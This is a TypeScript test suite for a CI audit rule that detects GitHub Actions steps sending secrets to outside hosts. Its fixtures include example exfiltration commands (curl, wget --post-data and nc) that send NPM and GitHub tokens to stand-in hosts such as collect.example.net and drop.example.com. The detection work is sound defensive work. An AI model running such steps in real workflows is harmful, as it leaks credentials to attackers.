/**
 * kit-research agent-vm-yolo-herdr-paseo-vs-kit: a workflow whose `run:` step posts
 * `${{ secrets.NPM_TOKEN }}` to an outside host produced only an "unpinned action" row in kit's
 * workflow audit. The step itself was invisible.
 */
import { describe, it } from "node:test";
import assert from "node:assert/strict";
import { readdirSync, readFileSync } from "node:fs";
import { join, resolve } from "node:path";

import { auditWorkflow } from "./gha-audit.js";
import { auditSecretEgress } from "./gha-secret-egress.js";

const SHA = "3d3c42e5aac5ba805825da76410c181273ba90b1";
const wf = (steps: string) =>
  `on: push\npermissions:\n  contents: read\njobs:\n  a:\n    runs-on: ubuntu-latest\n    steps:\n      - uses: actions/checkout@${SHA}\n${steps}`;
const NAME = "secret sent to an outside host (ci.yml)";
const detail = (steps: string) => auditSecretEgress(wf(steps), "ci.yml")[0]?.detail ?? "";

describe("auditSecretEgress flags a run step that sends a secret out", () => {
  it("an inline curl posting a secret expression, with its line and host", () => {
    const rows = auditSecretEgress(
      wf('      - run: curl -d "${{ secrets.NPM_TOKEN }}" https://collect.example.net/x\n'),
      "ci.yml",
    );
    assert.equal(rows.length, 1);
    assert.equal(rows[0]?.name, NAME);
    assert.equal(rows[0]?.status, "warn");
    assert.equal(rows[0]?.severity, "high");
    assert.equal(rows[0]?.rule?.id, "CICD-SEC-6");
    assert.match(rows[0]?.detail ?? "", /line 9 sends secrets\.NPM_TOKEN to collect\.example\.net/);
  });

  it("an Authorization header from an env var set from secrets, across a continuation", () => {
    const step =
      '      - env:\n          TOKEN: ${{ secrets.DEPLOY_TOKEN }}\n        run: |\n          curl -sS \\\n            -H "Authorization: Bearer $TOKEN" \\\n            https://hooks.example.org/in\n';
    assert.match(detail(step), /line 12 sends TOKEN to hooks\.example\.org/);
  });

  it("wget --post-data, nc and a host kit cannot read", () => {
    const step =
      '      - env:\n          K: ${{ secrets.K }}\n        run: |\n          wget --post-data "k=${K}" http://203.0.113.9/p\n          echo "${{ github.token }}" | nc -w 3 drop.example.com 4444\n          curl -H "X-Key: $K" "$TARGET_URL"\n';
    const d = detail(step);
    assert.match(d, /line 12 sends K to 203\.0\.113\.9/);
    assert.match(d, /line 13 sends github\.token to drop\.example\.com/);
    assert.match(d, /line 14 sends K to a host kit cannot read/);
  });
});

describe("auditSecretEgress leaves GitHub and secret-free steps alone", () => {
  it("the GitHub API, by name or through the runner's URL variables", () => {
    const step =
      '      - env:\n          GH_TOKEN: ${{ secrets.GITHUB_TOKEN }}\n        run: |\n          curl -H "Authorization: Bearer $GH_TOKEN" https://api.github.com/repos/o/r\n          curl -H "Authorization: Bearer ${{ github.token }}" "${{ github.api_url }}/user"\n          curl -H "Authorization: Bearer $GH_TOKEN" "$GITHUB_API_URL/user"\n          curl -T x -H "Authorization: Bearer $GH_TOKEN" https://uploads.github.com/u\n';
    assert.deepEqual(auditSecretEgress(wf(step), "ci.yml"), []);
  });

  it("a download with no secret, a secret on a non-network line, a comment, a boolean test", () => {
    const step =
      '      - env:\n          T: ${{ secrets.T }}\n          HAS: ${{ secrets.T != \'\' }}\n        run: |\n          curl -fsSL https://example.com/tool.tgz -o tool.tgz\n          ./deploy --token "$T"\n          # curl -d "$T" https://collect.example.net\n          curl -d "$HAS" https://example.com/flag\n          curl -d "$TX" https://example.com/other\n';
    assert.deepEqual(auditSecretEgress(wf(step), "ci.yml"), []);
  });
});

describe("auditSecretEgress and the registry a workflow publishes to", () => {
  const publish =
    "      - uses: actions/setup-node@" +
    SHA +
    "\n        with:\n          registry-url: https://registry.npmjs.org\n          node-auth-token: ${{ secrets.NPM_TOKEN }}\n" +
    "      - env:\n          NPM_TOKEN: ${{ secrets.NPM_TOKEN }}\n        run: |\n" +
    '          curl -H "Authorization: Bearer $NPM_TOKEN" https://registry.npmjs.org/-/whoami\n' +
    "          npm publish\n";

  it("leaves a call to the declared registry and the action's with: inputs alone", () => {
    assert.deepEqual(auditSecretEgress(wf(publish), "ci.yml"), []);
  });

  it("accepts docker login <host> and --registry, and GitHub's package hosts", () => {
    const step =
      '      - env:\n          T: ${{ secrets.T }}\n        run: |\n          echo "$T" | docker login -u me --password-stdin registry.example.io\n          curl -H "Authorization: Bearer $T" https://registry.example.io/v2/\n          curl -H "Authorization: Bearer $T" https://npm.pkg.github.com/x\n          docker push registry.example.io/app\n';
    assert.deepEqual(auditSecretEgress(wf(step), "ci.yml"), []);
  });

  it("still flags another host in a publishing workflow", () => {
    const step = publish + '          curl -d "$NPM_TOKEN" https://collect.example.net/x\n';
    assert.match(detail(step), /sends NPM_TOKEN to collect\.example\.net/);
  });

  it("does not trust a declared registry when the workflow publishes nothing", () => {
    const step = publish.replace("          npm publish\n", "");
    assert.match(detail(step), /sends NPM_TOKEN to registry\.npmjs\.org/);
  });
});

describe("kit's workflow audit includes it", () => {
  it("reports the row from auditWorkflow", () => {
    const step = '      - run: curl -d "${{ secrets.NPM_TOKEN }}" https://collect.example.net/x\n';
    assert.ok(auditWorkflow(wf(step), "ci.yml").some((r) => r.name === NAME));
  });

  it("finds nothing in kit's own workflows (the measured false-positive count)", () => {
    const dir = resolve(import.meta.dirname, "..", ".github", "workflows");
    const rows = readdirSync(dir)
      .filter((f) => /\.ya?ml$/.test(f))
      .flatMap((f) => auditSecretEgress(readFileSync(join(dir, f), "utf8"), f));
    assert.deepEqual(rows, []);
  });
});
